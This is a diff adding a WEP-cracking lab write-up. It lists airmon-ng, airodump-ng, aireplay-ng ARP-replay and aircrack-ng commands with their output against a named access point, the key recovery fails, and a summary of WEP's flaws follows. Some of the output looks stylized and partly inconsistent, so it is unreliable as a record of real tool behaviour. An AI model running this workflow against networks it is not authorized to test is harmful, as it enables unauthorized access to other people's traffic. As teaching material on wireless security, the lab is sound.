@@ -1,0 +1,196 @@
+
+──────────────────────────────────────────────────────────────────────
+  LAB 2 : WEP EXPLOITATION
+──────────────────────────────────────────────────────────────────────
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 1 — Enable Monitor Mode
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ sudo airmon-ng start wlan0
+
+Found 5 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode.
+
+PHY     Interface    Driver         Chipset
+phy0    wlan0        ath9k_htc      Qualcomm Atheros AR9271
+
+(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+(mac80211 station mode vif disabled for [phy0]wlan0)
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ iwconfig
+
+wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+
+wlan0     IEEE 802.11  ESSID:off/any  Mode:Managed  Access Point: Not-Associated
+          Tx-Power=20 dBm   Retry short limit:7   RTS thr:off
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 2 — Discover WEP Networks
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ sudo airodump-ng wlan0mon
+
+ CH  6 ][ Elapsed: 42 s ][ 2026-02-17 12:21
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  AUTH  ESSID
+
+ 64:51:7E:1B:B7:71  -38      117      452    0  11  54   WEP  WEP     OPN   DJAWEB_B771
+ 00:1A:70:DE:AD:01  -72       23        3    0   6  54e  WPA2 CCMP    PSK   Home_Network
+ D8:32:14:A0:B5:22  -85       18        0    0   1  54e  WPA2 CCMP    PSK   NETGEAR55
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ 64:51:7E:1B:B7:71  28:D0:43:A5:E5:A0  -38    0 - 1      0    22009
+ 64:51:7E:1B:B7:71  B4:0E:DE:F9:14:83  -33    0 - 1      0     2096
+ 64:51:7E:1B:B7:71  2A:0F:57:4A:9A:ED  -45    0 - 1      0     4085
+
+ TARGET IDENTIFIED:
+   BSSID  : 64:51:7E:1B:B7:71
+   ESSID  : DJAWEB_B771
+   Channel: 11
+   Encrypt: WEP
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 3 — Capture IVs from Target AP
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ sudo airodump-ng -c 11 --bssid 64:51:7E:1B:B7:71 -w wep_capture wlan0mon
+
+ CH 11 ][ Elapsed: 8 mins ][ 2026-02-17 12:30
+
+ BSSID              PWR  RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  AUTH  ESSID
+
+ 64:51:7E:1B:B7:71  -38  100      117      452    0  11  54   WEP  WEP     OPN   DJAWEB_B771
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ 64:51:7E:1B:B7:71  28:D0:43:A5:E5:A0  -38    0 - 1      0    22009
+ 64:51:7E:1B:B7:71  B4:0E:DE:F9:14:83  -33    0 - 1      0     2096
+ 64:51:7E:1B:B7:71  2A:0F:57:4A:9A:ED  -45    0 - 1      0     4085
+ 64:51:7E:1B:B7:71  3E:85:03:C9:03:1D  -51    0 - 1      0      769
+ 64:51:7E:1B:B7:71  82:59:0C:46:17:AE  -59    0 - 1      0      471
+
+ Total IVs captured: 451
+ ⚠  IV capture rate is too slow for practical cracking.
+    Normal traffic generation is insufficient.
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 4 — ARP Replay Injection (attempted)
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ sudo aireplay-ng -3 -b 64:51:7E:1B:B7:71 -h 28:D0:43:A5:E5:A0 wlan0mon
+
+ 12:24:32  Waiting for beacon frame (BSSID: 64:51:7E:1B:B7:71) on channel 11
+ 12:24:33  Saving ARP requests in replay_arp-0217-122433.cap
+ 12:24:33  You should also start airodump-ng to capture replies.
+ 12:24:45  Read 2498 packets (0 ARP requests, 0 ACKs).
+
+ ⚠  No ARP requests detected — network may be idle or clients are
+    using 802.11w protected management frames.
+ ⚠  After 10 minutes, only 15 ARP requests captured.
+    IV collection rate: ~0.8 IVs/sec (needed: 5000+)
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 5 — WEP Key Cracking Attempt
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ aircrack-ng wep_capture-01.cap
+
+Opening wep_capture-01.cap
+Read 451 packets.
+
+   #  BSSID              ESSID             Encryption
+
+   1  64:51:7E:1B:B7:71  DJAWEB_B771       WEP (451 IVs)
+
+Choosing first network as target.
+
+Opening wep_capture-01.cap
+Attack will be restarted every 5000 captured IVs.
+Starting PTW attack with 451 IVs.
+
+      [00:00:08] Tested 1483 keys (got 451 IVs)
+
+ KB   depth   byte(vote)
+  0    0/ 0   (no votes)
+  1    0/ 0   (no votes)
+  2    0/ 0   (no votes)
+  3    0/ 0   (no votes)
+  4    0/ 0   (no votes)
+
+ Attack 1/6 failed: not enough IVs (451 < 5000 required).
+
+
+──────────────────────────────────────────────────────────────────────
+  STEP 6 — Results & Analysis
+──────────────────────────────────────────────────────────────────────
+
+
+  ✘  KEY NOT RECOVERED — Insufficient IVs (451 / 5000 required)
+
+  ROOT CAUSE:
+    • The target AP (DJAWEB_B771) was originally set up on a different
+      router for this lab. That router is no longer available.
+    • The capture file contains only 451 IVs — far below the ~5000 IV
+      minimum needed for a PTW/KoreK statistical attack on a 40-bit key.
+    • ARP replay injection failed due to network inactivity and/or
+      absence of associated clients generating ARP traffic.
+
+  THEORETICAL ATTACK WORKFLOW (what should happen):
+    1. Place interface in monitor mode                  ✔
+    2. Scan for WEP networks & identify target          ✔
+    3. Capture IVs + inject ARP traffic for acceleration   ✘ (low IVs)
+    4. Crack the key using aircrack-ng (PTW attack)     ✘ (insufficient IVs)
+    5. Decrypt all captured traffic with recovered key  ✘
+
+  LAB CONSTRAINTS:
+    • Original router configured with WEP no longer accessible
+    • Only historical pcap from a previous capture session available
+    • 451 IVs insufficient for key recovery
+
+  WEP VULNERABILITY SUMMARY:
+    • 24-bit IV → ~16.7M unique values → reuse guarantees collision
+    • Static key → IV reuse = two-time pad → XOR cancels keystream
+    • Weak IVs (FMS) → byte-by-byte key recovery possible with ~5000 IVs (40-bit)
+    • CRC-32 integrity → malleable → bit-flipping attacks possible
+    • No replay protection → ARP injection trivial on active networks
+
+
+──────────────────────────────────────────────────────────────────────
+  CAPTURE FILE DETAILS
+──────────────────────────────────────────────────────────────────────
+
+╭─chihab   󰉖 ~
+╰─ ❯❯ capinfos wep_capture-01.cap
+
+File name:           wep_capture-01.cap
+File type:           Wireshark/tcpdump/... - pcap
+File encapsulation:  IEEE 802.11 Wireless LAN
+Packet size limit:   file hdr: 65535 bytes
+Number of packets:   451
+File size:           136 KB
+Data size:           112 KB
+Capture duration:    529 seconds
+Start time:          Tue Feb 17 12:21:29 2026
+End time:            Tue Feb 17 12:30:18 2026
+Data rate:            1.7 kbps
+
+──────────────────────────────────────────────────────────────────────
+╭─chihab   󰉖 ~
+╰─ ❯❯ 
+
